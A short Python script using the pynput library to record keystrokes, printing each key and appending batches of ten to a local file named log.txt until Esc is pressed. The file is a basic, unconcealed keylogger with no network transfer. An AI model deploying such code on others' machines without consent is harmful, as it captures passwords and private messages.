import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    #Handle key press event
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")
    if count > 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    #Write keys to file
    try:
        with open("log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("key") == -1:
                    f.write(k)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
   #Handle key release event
    if key == Key.esc:
        return False

def main():
    global keys, count
    keys = []
    count = 0
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()